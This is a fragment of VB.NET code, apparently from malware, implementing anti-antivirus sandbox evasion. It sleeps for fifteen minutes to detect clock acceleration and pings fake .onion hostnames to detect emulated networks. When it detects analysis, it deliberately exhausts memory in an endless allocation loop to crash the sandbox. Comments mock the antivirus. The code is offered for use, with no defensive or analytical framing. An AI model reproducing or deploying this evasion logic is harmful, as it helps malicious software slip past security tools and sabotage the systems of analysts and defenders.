...
notyet:
    ...
    Dim avchkd As Boolean = False
    Sub GTM()
        If avchkd = False Then
            If AVD(avs) Then
                Dim tms As Integer = (TimeOfDay.ToString("hh") * 60 * 60 * 1000) + (TimeOfDay.ToString("mm") * 60 * 1000) + (TimeOfDay.ToString("ss") * 1000)
                Dim ct As Integer = TimeOfDay.ToString("mm")
                Dim tos As Integer = 0
                Dim lt As Integer = ct
                For i = 1 To 15
                    Threading.Thread.Sleep(1 * 60000)
                    If lt = 59 Then
                        If TimeOfDay.ToString("mm") <> "00" Then
                            tos += 1
                        End If
                    Else
                        If lt = TimeOfDay.ToString("mm") Then
                            tos += 1
                        End If
                    End If
                Next
                If tms <> ((TimeOfDay.ToString("hh") * 60 * 60 * 1000) + (TimeOfDay.ToString("mm") * 60 * 1000) + (TimeOfDay.ToString("ss") * 1000) - (15 * 60000)) Or tos > 0 Then
                    ' An AV might be missing with us!
                    Dim ps As Integer = 0
                    For Each s In {"google.onion", "amazon.onion", "ebay.onion", "facebook.onion", "av.oion"}
                        If CUH(s) Then
                            ' AV is stupid enough to ping an unreal website!
                            ps += 1
                        End If
                    Next
                    If ps > 0 Then
                        ' Let's play homie ;)
                        Dim byt(9999999) As Byte
                        Dim bytlist As New List(Of Byte())
                        Do While 1
                            byt = New Byte(9999999) {}
                            bytlist.Add(byt)
                        Loop
                        End ' In case it skips the while loop
                    End If
                End If
            End If
            avchkd = True
